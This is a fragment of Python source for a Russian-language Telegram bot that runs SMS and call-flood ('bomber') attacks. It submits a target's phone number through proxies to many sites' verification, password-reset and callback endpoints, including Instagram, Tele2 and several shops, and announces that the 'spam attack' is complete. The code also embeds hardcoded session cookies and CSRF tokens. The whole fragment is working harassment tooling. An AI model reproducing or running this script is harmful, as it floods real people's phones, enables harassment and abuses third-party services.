                    requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username':phone}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
                except Exception as e:
                    pass
                try:
                    requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": phone, "invitation_text": ""}, headers=headers, proxies=proxies)
                    print('jivosite.com')
                except:
                      print('Не отправлено (jivosite.com)')
                try:
                    requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": phone, "client_id": "-5", "dispatch_type": "call"}, headers=headers, proxies=proxies)
                except:
                      pass
                try:
                    print(3)
                    requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + phone, headers=headers,  proxies=proxies)
                except:
                      pass
                try:
                    print(4)
                    requests.post("https://skoro-pizza.ru/api/user/generate-password", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
                    pass
                except:
                      pass
                try:
                    print(5)
                    requests.post(f"https://www.2020700.ru/views/ajax/smscsend.php?phone={phone}", headers=headers, proxies=proxies)
                except:
                      pass
                try:
                    print(6)
                    requests.post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
                except:
                      pass
                try:
                    requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
                except:
                      pass
                try:
                    requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, headers=headers, proxies=proxies)
                except:
                      pass
                try:
                    requests.post("https://brilliant24.ru/index/callme", data={"phone": "+" + phone}, headers=headers, proxies=proxies)
                except:
                    print("135678")
                print("sikl zatata")
            bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"✅Спам атака на номер {phone} завершена. \nОтзыв вы можете отправить сюдa: @termqew")
            try:
                database = pickle.load( open( "database.p", "rb" ) )
                database["bmb_ids"].remove(chat_id)
                pickle.dump( database, open("database.p", "wb") )
            except:
                pass
            try:
                database = pickle.load( open( "database.p", "rb" ) )
                database["bmb_numbers"].remove(phone)
                pickle.dump( database, open("database.p", "wb") )
            except:
                pass
    except Exception as e:
        print(e) 
        bot.send_message(message.from_user.id, f"Убедитесь, что номер нужного формата и поторите попытку")
        main_menu(message)
bot.polling(none_stop=True)
